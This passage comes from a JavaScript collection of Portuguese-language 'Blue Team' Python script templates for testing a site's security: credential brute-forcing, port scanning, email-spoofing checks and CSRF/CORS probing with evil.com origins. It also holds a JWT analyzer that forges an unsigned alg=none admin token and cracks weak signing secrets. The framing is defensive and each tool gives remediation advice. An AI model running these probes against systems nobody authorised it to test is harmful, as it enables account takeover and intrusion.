            r = requests.post(login_url, json={"email": "admin@test.com", "password": f"wrongpass{i}"},
                              timeout=TIMEOUT, verify=False, headers=HEADERS)
            if "locked" in r.text.lower() or "blocked" in r.text.lower():
                print(f"  ✅ Account lockout ativo após {i+1} tentativas")
                return True
        except Exception:
            pass
        time.sleep(0.1)
    print("  ⚠️  Account lockout NÃO detectado")
    return False

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Hydra-Style Credential Tester                   ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    login_url, initial_status = detect_login_endpoint(base)
    if not login_url:
        print("  ℹ️  Nenhum endpoint de login padrão detectado.")
        login_url = base + "/api/auth/login"

    print()
    has_rate_limit = check_rate_limiting(login_url)
    time.sleep(1)
    has_lockout = check_lockout(login_url)

    print()
    print(f"[*] Testando {len(DEFAULT_CREDENTIALS)} credenciais padrão...")
    findings = []
    for i, (user, pw) in enumerate(DEFAULT_CREDENTIALS, 1):
        result = test_credential(login_url, user, pw, i)
        if result.get("success"):
            findings.append(result)
            print(f"  🔴 CREDENCIAL PADRÃO ACEITA! {user}:{pw[:3]}***")
        elif result.get("rate_limited"):
            print(f"  ✅ Rate limited na tentativa {i}")
            break
        time.sleep(DELAY)

    print()
    print("=" * 64)
    print(f"  Rate Limiting : {'✅ Ativo' if has_rate_limit else '🔴 AUSENTE'}")
    print(f"  Account Lockout: {'✅ Ativo' if has_lockout else '🔴 AUSENTE'}")
    print(f"  Credenciais Padrão Aceitas: {len(findings)}")
    if not has_rate_limit:
        print()
        print("  ⚠️  RECOMENDAÇÕES:")
        print("     • Implementar rate limiting (ex: 5 tentativas / 15min)")
        print("     • Implementar CAPTCHA após 3 tentativas falhas")
        print("     • Ativar account lockout temporário")
        print("     • Alertas em tempo real para brute force")

    output = {"target": base, "login_url": login_url,
              "timestamp": datetime.now().isoformat(),
              "has_rate_limit": has_rate_limit, "has_lockout": has_lockout,
              "credentials_found": findings}
    with open("hydra_test_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\\n[✓] Resultados em: hydra_test_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 10. Metasploit-Style Service Enumeration ───────────────────────
  metasploit_enum: {
    id: 'metasploit_enum',
    name: 'Metasploit-Style Service Enumeration',
    category: 'Reconhecimento',
    severity: 'medium',
    description: 'Enumera serviços, portas abertas, banners, tecnologias e CVEs conhecidos. Equivalente ao Metasploit scanner/discovery em Python puro.',
    icon: '🎯',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Metasploit-Style Service Enumeration            ║
║  Propósito: Enumerar serviços e detectar versões expostas    ║
║  Alvo: ${url}
║  Uso: python metasploit_enum.py [URL]                        ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys, json, socket, time, requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 5

# Portas e serviços comuns a escanear
COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
    53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 1433: "MSSQL", 1521: "Oracle",
    2375: "Docker (unsecured!)", 2376: "Docker TLS",
    3000: "Dev Server", 3306: "MySQL", 4243: "Docker",
    5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
    7000: "Cassandra", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
    8888: "Jupyter", 9000: "Portainer/PHP-FPM",
    9090: "Prometheus", 9200: "Elasticsearch",
    27017: "MongoDB", 51820: "WireGuard",
}

# Padrões de banner para fingerprinting
BANNER_SIGNATURES = {
    "nginx": "Nginx Web Server",
    "apache": "Apache HTTP Server",
    "microsoft-iis": "Microsoft IIS",
    "cloudflare": "Cloudflare CDN",
    "vercel": "Vercel Platform",
    "aws": "Amazon Web Services",
    "php/": "PHP (version exposed!)",
    "python/": "Python (version exposed!)",
    "node.js": "Node.js",
    "express": "Express.js",
    "tomcat": "Apache Tomcat",
    "jboss": "JBoss",
    "jenkins": "Jenkins CI/CD",
    "grafana": "Grafana",
    "prometheus": "Prometheus",
}

# Paths que expõem informações de versão
VERSION_PATHS = [
    "/api/version", "/version", "/api/health", "/health",
    "/_version", "/status", "/api/status", "/info",
    "/api/info", "/actuator/info", "/actuator/health",
    "/server-info", "/api/server-info",
    "/.well-known/security.txt",
    "/robots.txt", "/sitemap.xml",
    "/wp-json/wp/v2/", "/xmlrpc.php",
]

def scan_port(host, port, service):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            return {"port": port, "service": service, "open": True}
    except Exception:
        pass
    return {"port": port, "service": service, "open": False}

def grab_banner(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, port))
        sock.send(b"HEAD / HTTP/1.0\\r\\n\\r\\n")
        banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
        sock.close()
        return banner[:200]
    except Exception:
        return ""

def get_http_fingerprint(base):
    findings = []
    try:
        r = requests.get(base, timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": "BlueTeam-Recon/1.0"})
        server = r.headers.get("Server", "")
        powered_by = r.headers.get("X-Powered-By", "")
        via = r.headers.get("Via", "")

        for sig, name in BANNER_SIGNATURES.items():
            if sig.lower() in (server + powered_by + via + r.text[:500]).lower():
                findings.append({"type": "Technology", "name": name,
                                  "source": "headers+body", "severity": "INFO"})

        if server:
            findings.append({"type": "Server Header", "value": server,
                              "severity": "MEDIUM" if "/" in server else "INFO"})
        if powered_by:
            findings.append({"type": "X-Powered-By (version exposed!)", "value": powered_by,
                              "severity": "HIGH"})
    except Exception as e:
        findings.append({"type": "HTTP Error", "error": str(e)[:40]})
    return findings

def check_version_paths(base):
    exposures = []
    print("[*] Verificando endpoints que expõem versões...")
    for path in VERSION_PATHS:
        url = base.rstrip("/") + path
        try:
            r = requests.get(url, timeout=TIMEOUT, verify=False,
                             headers={"User-Agent": "BlueTeam-Recon/1.0"})
            if r.status_code == 200:
                body = r.text[:300]
                print(f"  ✅ Acessível: {path} ({r.status_code}) — {len(r.text)} bytes")
                exposures.append({"path": path, "status": r.status_code, "preview": body[:100]})
        except Exception:
            pass
    return exposures

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base
    parsed = urlparse(base)
    host = parsed.hostname or parsed.netloc

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Metasploit-Style Service Enumeration            ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Host  : {host:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    # Port scan
    print("[*] Escaneando portas comuns...")
    open_ports = []
    with ThreadPoolExecutor(max_workers=20) as exe:
        futures = {exe.submit(scan_port, host, port, svc): (port, svc)
                   for port, svc in COMMON_PORTS.items()}
        for f in as_completed(futures):
            r = f.result()
            if r["open"]:
                open_ports.append(r)
                danger = "🔴" if r["service"] in ["Docker (unsecured!)", "Redis", "MongoDB", "Elasticsearch"] else "ℹ️"
                print(f"  {danger} Port {r['port']:5}/tcp OPEN — {r['service']}")

    if not open_ports:
        print("  ✅ Nenhuma porta inesperada aberta")

    # HTTP fingerprint
    print()
    print("[*] Fingerprinting HTTP...")
    http_findings = get_http_fingerprint(base)
    for f in http_findings:
        icon = "🔴" if f.get("severity") == "HIGH" else "ℹ️"
        print(f"  {icon} {f['type']}: {f.get('value', f.get('name', ''))}")

    # Version paths
    print()
    version_exposures = check_version_paths(base)

    print()
    print("=" * 64)
    dangerous = [p for p in open_ports if "unsecured" in p["service"] or p["port"] in [6379, 27017, 9200]]
    print(f"  Portas abertas: {len(open_ports)} | Perigosas: {len(dangerous)}")
    print(f"  Endpoints de versão expostos: {len(version_exposures)}")
    if dangerous:
        print()
        print("  🔴 PORTAS CRÍTICAS EXPOSTAS — feche imediatamente no firewall!")

    output = {"target": base, "host": host, "timestamp": datetime.now().isoformat(),
              "open_ports": open_ports, "http_fingerprint": http_findings,
              "version_exposures": version_exposures}
    with open("metasploit_enum_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\\n[✓] Resultados em: metasploit_enum_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 11. Phishing & Email Security Analyzer ─────────────────────────
  phishing_analyzer: {
    id: 'phishing_analyzer',
    name: 'Phishing & Email Security Analyzer',
    category: 'Phishing',
    severity: 'high',
    description: 'Analisa configurações anti-phishing: SPF, DKIM, DMARC, BIMI. Detecta domínios typosquatting e URLs suspeitas no site.',
    icon: '🎣',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Phishing & Email Security Analyzer              ║
║  Propósito: Verificar proteções anti-phishing                ║
║  Alvo: ${url}
║  Uso: python phishing_analyzer.py [URL]                      ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys, json, socket, re, requests
from datetime import datetime
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 8

def get_domain(url):
    parsed = urlparse(url if url.startswith("http") else "https://" + url)
    return parsed.hostname or parsed.netloc

def check_spf(domain):
    """Verifica registro SPF via DNS TXT."""
    try:
        import dns.resolver
        answers = dns.resolver.resolve(domain, 'TXT')
        for r in answers:
            txt = r.to_text().strip('"')
            if txt.startswith("v=spf1"):
                has_all = "-all" in txt or "~all" in txt
                hard_fail = "-all" in txt
                return {"present": True, "record": txt[:100],
                        "hard_fail": hard_fail, "soft_fail": "~all" in txt,
                        "status": "OK" if hard_fail else "WARN"}
        return {"present": False, "status": "FAIL", "issue": "SPF record not found"}
    except ImportError:
        # Fallback sem dnspython
        return check_spf_via_doh(domain)
    except Exception as e:
        return {"present": False, "error": str(e)[:40], "status": "ERROR"}

def check_spf_via_doh(domain):
    """Fallback: verifica SPF via DNS-over-HTTPS (Cloudflare DoH)."""
    try:
        r = requests.get(f"https://cloudflare-dns.com/dns-query?name={domain}&type=TXT",
                         headers={"Accept": "application/dns-json"}, timeout=TIMEOUT)
        data = r.json()
        for ans in data.get("Answer", []):
            txt = ans.get("data", "").strip('"')
            if "v=spf1" in txt:
                return {"present": True, "record": txt[:100],
                        "hard_fail": "-all" in txt, "status": "OK" if "-all" in txt else "WARN"}
        return {"present": False, "status": "FAIL"}
    except Exception as e:
        return {"present": False, "error": str(e)[:40]}

def check_dmarc(domain):
    """Verifica DMARC via DoH."""
    try:
        r = requests.get(f"https://cloudflare-dns.com/dns-query?name=_dmarc.{domain}&type=TXT",
                         headers={"Accept": "application/dns-json"}, timeout=TIMEOUT)
        data = r.json()
        for ans in data.get("Answer", []):
            txt = ans.get("data", "").strip('"')
            if "v=DMARC1" in txt:
                policy = re.search(r'p=(\\w+)', txt)
                p = policy.group(1) if policy else "none"
                return {"present": True, "record": txt[:150], "policy": p,
                        "status": "OK" if p in ["quarantine", "reject"] else "WARN"}
        return {"present": False, "status": "FAIL", "issue": "DMARC not configured"}
    except Exception as e:
        return {"present": False, "error": str(e)[:40]}

def check_bimi(domain):
    """Verifica BIMI (Brand Indicators for Message Identification)."""
    try:
        r = requests.get(f"https://cloudflare-dns.com/dns-query?name=default._bimi.{domain}&type=TXT",
                         headers={"Accept": "application/dns-json"}, timeout=TIMEOUT)
        data = r.json()
        for ans in data.get("Answer", []):
            txt = ans.get("data", "").strip('"')
            if "v=BIMI1" in txt:
                return {"present": True, "record": txt[:100], "status": "OK"}
        return {"present": False, "status": "INFO", "note": "BIMI not configured (optional)"}
    except Exception:
        return {"present": False}

def check_typosquatting(domain):
    """Gera variações typosquatting comuns e verifica se estão registradas."""
    base = domain.split(".")[0]
    tld = ".".join(domain.split(".")[1:])
    common_typos = [
        base.replace("a", "4"), base.replace("o", "0"), base.replace("i", "1"),
        base + "-login", base + "-secure", base + "-official",
        base.replace("l", "1"), "www" + base, base + tld.replace(".", ""),
    ]
    registered = []
    for typo in common_typos[:6]:
        fake_domain = f"{typo}.{tld}"
        try:
            socket.gethostbyname(fake_domain)
            registered.append({"domain": fake_domain, "resolves": True, "risk": "HIGH"})
            print(f"  ⚠️  Domínio typosquatting registrado: {fake_domain}")
        except socket.gaierror:
            pass
    return registered

def check_external_links(base):
    """Verifica links externos no site que podem indicar phishing."""
    suspicious = []
    try:
        r = requests.get(base, timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": "BlueTeam-PhishingAnalyzer/1.0"})
        links = re.findall(r'href=["\\'](https?://[^"\\'>]+)', r.text)
        current_domain = get_domain(base)
        for link in links[:50]:
            link_domain = get_domain(link)
            if link_domain and link_domain != current_domain:
                if any(kw in link_domain for kw in ["login", "secure", "account", "verify", "update"]):
                    suspicious.append({"url": link[:100], "domain": link_domain, "reason": "suspicious keyword"})
    except Exception:
        pass
    return suspicious

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base
    domain = get_domain(base)

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Phishing & Email Security Analyzer              ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Domínio: {domain:<51}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    issues = []

    print("[*] Verificando SPF...")
    spf = check_spf(domain)
    icon = "✅" if spf.get("status") == "OK" else ("⚠️" if spf.get("status") == "WARN" else "🔴")
    print(f"  {icon} SPF: {'Presente' if spf.get('present') else 'AUSENTE'}" +
          (f" — {spf.get('record','')[:60]}" if spf.get("record") else ""))
    if spf.get("status") != "OK":
        issues.append("SPF ausente ou sem hard fail (-all)")

    print()
    print("[*] Verificando DMARC...")
    dmarc = check_dmarc(domain)
    icon = "✅" if dmarc.get("status") == "OK" else "🔴"
    print(f"  {icon} DMARC: {'Presente' if dmarc.get('present') else 'AUSENTE'}" +
          (f" — policy={dmarc.get('policy')}" if dmarc.get("policy") else ""))
    if dmarc.get("status") != "OK":
        issues.append(f"DMARC ausente ou policy=none (emails podem ser forjados!)")

    print()
    print("[*] Verificando BIMI...")
    bimi = check_bimi(domain)
    print(f"  {'✅' if bimi.get('present') else 'ℹ️'} BIMI: {'Configurado' if bimi.get('present') else 'Não configurado (opcional)'}")

    print()
    print("[*] Verificando typosquatting...")
    typos = check_typosquatting(domain)
    if not typos:
        print("  ✅ Nenhum domínio typosquatting detectado")

    print()
    print("[*] Verificando links suspeitos no site...")
    suspicious_links = check_external_links(base)
    if suspicious_links:
        for link in suspicious_links[:5]:
            print(f"  ⚠️  Link suspeito: {link['url'][:80]}")
    else:
        print("  ✅ Nenhum link externo suspeito detectado")

    print()
    print("=" * 64)
    if issues:
        print("  🔴 PROBLEMAS CRÍTICOS:")
        for issue in issues:
            print(f"     • {issue}")
        print()
        print("  RECOMENDAÇÕES:")
        print("     • Configure SPF com -all (hard fail)")
        print("     • Configure DMARC com policy=reject")
        print("     • Monitore domínios typosquatting")
        print("     • Implemente BIMI com certificado VMC")
    else:
        print("  ✅ Configurações anti-phishing adequadas!")

    output = {"target": base, "domain": domain, "timestamp": datetime.now().isoformat(),
              "spf": spf, "dmarc": dmarc, "bimi": bimi,
              "typosquatting": typos, "suspicious_links": suspicious_links}
    with open("phishing_analysis_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\\n[✓] Resultados em: phishing_analysis_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 12. CSRF Token Tester ─────────────────────────────────────────
  csrf_tester: {
    id: 'csrf_tester',
    name: 'CSRF Token Tester',
    category: 'Autenticação',
    severity: 'high',
    description: 'Testa proteção CSRF: verifica tokens, SameSite cookies, CORS preflight e headers de origem em operações de estado.',
    icon: '🔄',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — CSRF Token Tester                               ║
║  Propósito: Verificar proteção contra CSRF                   ║
║  Alvo: ${url}
║  Uso: python csrf_tester.py [URL]                            ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys, json, re, requests
from datetime import datetime

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 8
HEADERS = {"User-Agent": "BlueTeam-CSRFTester/1.0"}

STATE_CHANGING_PATHS = [
    "/api/users", "/api/profile", "/api/settings",
    "/api/password", "/api/email", "/api/auth",
    "/api/v1/users", "/api/account",
    "/auth/v1/user",  # Supabase
    "/api/delete", "/api/transfer",
]

def check_samesite_cookies(base):
    try:
        r = requests.get(base, timeout=TIMEOUT, verify=False, headers=HEADERS)
        findings = []
        for cookie in r.cookies:
            samesite = cookie._rest.get("SameSite", "").lower() if hasattr(cookie, "_rest") else ""
            secure = cookie.secure
            httponly = cookie.has_nonstandard_attr("HttpOnly") if hasattr(cookie, "has_nonstandard_attr") else False
            issue = not samesite or samesite == "none"
            findings.append({
                "name": cookie.name, "secure": secure,
                "samesite": samesite or "NOT SET",
                "httponly": httponly, "issue": issue
            })
            if issue:
                print(f"  ⚠️  Cookie sem SameSite: {cookie.name}")
            else:
                print(f"  ✅ Cookie OK: {cookie.name} (SameSite={samesite})")
        return findings
    except Exception as e:
        return [{"error": str(e)[:40]}]

def check_csrf_on_endpoint(base, path, method="POST"):
    url = base.rstrip("/") + path
    findings = []
    try:
        # Tenta sem CSRF token e com Origin diferente
        headers = {**HEADERS,
                   "Origin": "https://evil-attacker.com",
                   "Referer": "https://evil-attacker.com/csrf-attack",
                   "Content-Type": "application/json"}
        payload = {"test": "csrf-probe", "action": "update"}

        if method == "POST":
            r = requests.post(url, json=payload, timeout=TIMEOUT, verify=False, headers=headers)
        else:
            r = requests.put(url, json=payload, timeout=TIMEOUT, verify=False, headers=headers)

        # Se não retorna 403/401/422 pode ser vulnerável a CSRF
        cors_allow_origin = r.headers.get("Access-Control-Allow-Origin", "")
        cors_allow_creds = r.headers.get("Access-Control-Allow-Credentials", "false")

        if cors_allow_origin == "*" and cors_allow_creds.lower() == "true":
            findings.append({"path": path, "issue": "CORS wildcard + credentials — CSRF/CORS misconfiguration",
                              "severity": "CRITICAL"})
            print(f"  🔴 CRÍTICO! CORS wildcard + credentials: {path}")
        elif r.status_code not in [401, 403, 404, 405, 422]:
            findings.append({"path": path, "status": r.status_code,
                              "issue": "Request accepted from foreign origin without CSRF check",
                              "severity": "HIGH"})
            print(f"  ⚠️  Possível CSRF: {path} → {r.status_code}")
        else:
            print(f"  ✅ Protegido: {path} → {r.status_code}")
    except Exception:
        pass
    return findings

def check_cors_preflight(base):
    findings = []
    try:
        r = requests.options(base, timeout=TIMEOUT, verify=False,
                             headers={**HEADERS,
                                      "Origin": "https://evil.com",
                                      "Access-Control-Request-Method": "POST",
                                      "Access-Control-Request-Headers": "Authorization"})
        allow_origin = r.headers.get("Access-Control-Allow-Origin", "")
        allow_creds = r.headers.get("Access-Control-Allow-Credentials", "")
        allow_methods = r.headers.get("Access-Control-Allow-Methods", "")

        if allow_origin in ["*", "https://evil.com"]:
            findings.append({"issue": f"CORS allows evil.com: {allow_origin}", "severity": "CRITICAL"})
            print(f"  🔴 CORS aceita origem maliciosa: {allow_origin}")
        elif not allow_origin:
            print(f"  ✅ CORS preflight não permite origem externa")
        else:
            print(f"  ✅ CORS controlado: {allow_origin}")

        if allow_creds.lower() == "true" and allow_origin == "*":
            findings.append({"issue": "CORS * + credentials = CSRF risk!", "severity": "CRITICAL"})
    except Exception:
        pass
    return findings

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — CSRF Token Tester                               ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    all_findings = []

    print("[*] Verificando SameSite em cookies...")
    cookie_findings = check_samesite_cookies(base)

    print()
    print("[*] Testando CORS preflight...")
    cors_findings = check_cors_preflight(base)
    all_findings.extend(cors_findings)

    print()
    print("[*] Testando endpoints de mudança de estado...")
    for path in STATE_CHANGING_PATHS[:8]:
        findings = check_csrf_on_endpoint(base, path)
        all_findings.extend(findings)

    print()
    print("=" * 64)
    criticals = [f for f in all_findings if f.get("severity") == "CRITICAL"]
    print(f"  Vulnerabilidades CSRF encontradas: {len(all_findings)}")
    print(f"  🔴 Críticas: {len(criticals)}")
    if not all_findings:
        print("  ✅ Proteções CSRF adequadas!")
    else:
        print()
        print("  RECOMENDAÇÕES:")
        print("     • Implementar tokens CSRF em todos os formulários")
        print("     • Configurar SameSite=Strict ou SameSite=Lax em cookies")
        print("     • Restringir CORS a origens permitidas explicitamente")
        print("     • Validar header Origin/Referer no servidor")

    output = {"target": base, "timestamp": datetime.now().isoformat(),
              "cookie_findings": cookie_findings, "cors_findings": cors_findings,
              "csrf_findings": all_findings}
    with open("csrf_test_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\\n[✓] Resultados em: csrf_test_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 13. JWT Analyzer ──────────────────────────────────────────────
  jwt_analyzer: {
    id: 'jwt_analyzer',
    name: 'JWT Token Analyzer',
    category: 'Autenticação',
    severity: 'critical',
    description: 'Analisa JWTs expostos: algoritmo none, weak secrets, RS256 confusion, key exposure, claims inseguras e expiração.',
    icon: '🔏',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — JWT Token Analyzer                              ║
║  Propósito: Detectar falhas em implementações JWT            ║
║  Alvo: ${url}
║  Uso: python jwt_analyzer.py [URL] [optional-jwt-token]      ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys, json, base64, time, requests, re, hmac, hashlib
from datetime import datetime

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
KNOWN_JWT   = sys.argv[2] if len(sys.argv) > 2 else None
TIMEOUT = 8
HEADERS = {"User-Agent": "BlueTeam-JWTAnalyzer/1.0"}

WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "jwt_secret",
    "supersecret", "change_me", "your-secret", "mysecret",
    "key", "private", "token", "auth", "supabase",
    "development", "test", "debug", "qwerty", "",
]

def decode_b64_safe(s):
    s += "=" * (-len(s) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(s))
    except Exception:
        return None

def analyze_jwt(token):
    """Decodifica e analisa um JWT sem verificar assinatura."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return {"valid_format": False, "error": "Not a valid JWT format"}

    header  = decode_b64_safe(parts[0])
    payload = decode_b64_safe(parts[1])
    if not header or not payload:
        return {"valid_format": False, "error": "Cannot decode JWT"}

    issues = []
    alg = header.get("alg", "").upper()

    if alg == "NONE":
        issues.append({"severity": "CRITICAL", "issue": "alg=none! JWT is unsigned — trivially forgeable"})
    elif alg in ["HS256", "HS384", "HS512"]:
        issues.append({"severity": "INFO", "issue": f"HMAC ({alg}) — check for weak secret"})
    elif alg.startswith("RS"):
        issues.append({"severity": "INFO", "issue": f"RSA ({alg}) — check for RS256->HS256 confusion"})

    # Verifica claims perigosas
    exp = payload.get("exp")
    iat = payload.get("iat")
    now = time.time()

    if not exp:
        issues.append({"severity": "HIGH", "issue": "No 'exp' claim — token never expires!"})
    elif exp < now:
        issues.append({"severity": "WARN", "issue": f"Token EXPIRED at {datetime.fromtimestamp(exp).isoformat()}"})
    elif exp - now > 86400 * 30:
        issues.append({"severity": "MEDIUM", "issue": f"Token expires in {int((exp-now)/86400)} days — too long"})

    return {"valid_format": True, "header": header, "payload": payload,
            "algorithm": alg, "issues": issues,
            "expires_at": datetime.fromtimestamp(exp).isoformat() if exp else None}

def test_weak_secret(token, secret):
    """Testa se um HMAC JWT foi assinado com segredo fraco."""
    parts = token.split(".")
    if len(parts) != 3:
        return False
    msg = f"{parts[0]}.{parts[1]}".encode()
    for alg, digestmod in [("HS256", hashlib.sha256), ("HS384", hashlib.sha384), ("HS512", hashlib.sha512)]:
        sig = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), msg, digestmod).digest()
        ).rstrip(b"=").decode()
        if sig == parts[2]:
            return alg
    return False

def extract_jwts_from_site(base):
    """Extrai JWTs do código-fonte do site."""
    found = []
    try:
        for path in ["", "/app.js", "/main.js", "/bundle.js", "/static/js/main.js"]:
            r = requests.get(base.rstrip("/") + path, timeout=TIMEOUT, verify=False, headers=HEADERS)
            jwts = re.findall(r'eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}', r.text)
            for jwt in set(jwts[:5]):
                found.append({"source": path or "/", "token_preview": jwt[:30] + "..."})
    except Exception:
        pass
    return found

def test_none_algorithm(base):
    """Testa se o servidor aceita JWTs com alg=none."""
    try:
        # Cria um JWT com alg=none
        header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"service_role","exp":9999999999}).encode()).rstrip(b"=").decode()
        fake_jwt = f"{header}.{payload}."

        for path in ["/api/users", "/api/me", "/api/profile", "/api/admin"]:
            r = requests.get(base.rstrip("/") + path, timeout=TIMEOUT, verify=False,
                             headers={**HEADERS, "Authorization": f"Bearer {fake_jwt}"})
            if r.status_code == 200:
                return {"accepted": True, "path": path, "severity": "CRITICAL"}
    except Exception:
        pass
    return {"accepted": False}

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — JWT Token Analyzer                              ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    all_issues = []

    print("[*] Extraindo JWTs expostos no código-fonte...")
    exposed = extract_jwts_from_site(base)
    if exposed:
        for e in exposed:
            print(f"  ⚠️  JWT encontrado em {e['source']}: {e['token_preview']}")
            all_issues.append({"issue": f"JWT exposto em {e['source']}", "severity": "HIGH"})
    else:
        print("  ✅ Nenhum JWT exposto no código-fonte")

    print()
    print("[*] Testando alg=none attack...")
    none_result = test_none_algorithm(base)
    if none_result["accepted"]:
        print(f"  🔴 CRÍTICO! Servidor aceita alg=none em {none_result['path']}")
        all_issues.append(none_result)
    else:
        print("  ✅ Servidor rejeita alg=none")

    if KNOWN_JWT:
        print()
        print("[*] Analisando JWT fornecido...")
        analysis = analyze_jwt(KNOWN_JWT)
        if analysis.get("valid_format"):
            print(f"  Algorithm: {analysis['algorithm']}")
            print(f"  Expires  : {analysis.get('expires_at', 'NEVER')}")
            for issue in analysis.get("issues", []):
                icon = "🔴" if issue["severity"] in ["CRITICAL","HIGH"] else "⚠️"
                print(f"  {icon} [{issue['severity']}] {issue['issue']}")
            all_issues.extend(analysis.get("issues", []))

            # Testa weak secrets se HMAC
            if analysis["algorithm"].startswith("HS"):
                print()
                print("[*] Testando segredos fracos (wordlist)...")
                for secret in WEAK_SECRETS:
                    alg = test_weak_secret(KNOWN_JWT, secret)
                    if alg:
                        print(f"  🔴 CRÍTICO! Segredo fraco encontrado: '{secret}' ({alg})")
                        all_issues.append({"severity": "CRITICAL", "issue": f"JWT signed with weak secret: '{secret}'"})
                        break
                else:
                    print("  ✅ Segredo não encontrado na wordlist padrão")

    print()
    print("=" * 64)
    criticals = [i for i in all_issues if i.get("severity") == "CRITICAL"]
    print(f"  Issues JWT: {len(all_issues)} | Críticas: {len(criticals)}")
    if not all_issues:
        print("  ✅ Implementação JWT aparentemente segura")

    output = {"target": base, "timestamp": datetime.now().isoformat(),
              "exposed_jwts": exposed, "none_attack": none_result, "issues": all_issues}
    with open("jwt_analysis_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\\n[✓] Resultados em: jwt_analysis_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 14. SSRF Scanner ──────────────────────────────────────────────
  ssrf_scanner: {
    id: 'ssrf_scanner',
    name: 'SSRF (Server-Side Request Forgery) Scanner',
    category: 'Injeção',
    severity: 'critical',
    description: 'Detecta SSRF: testa se o servidor faz requisições para URLs controladas pelo atacante, metadata de cloud, IPs internos e protocolos.',
    icon: '🌐',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — SSRF Scanner                                    ║
║  Propósito: Detectar Server-Side Request Forgery             ║
║  Alvo: ${url}
║  Uso: python ssrf_scanner.py [URL]                           ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys, json, time, requests
from datetime import datetime

requests.packages.urllib3.disable_warnings()

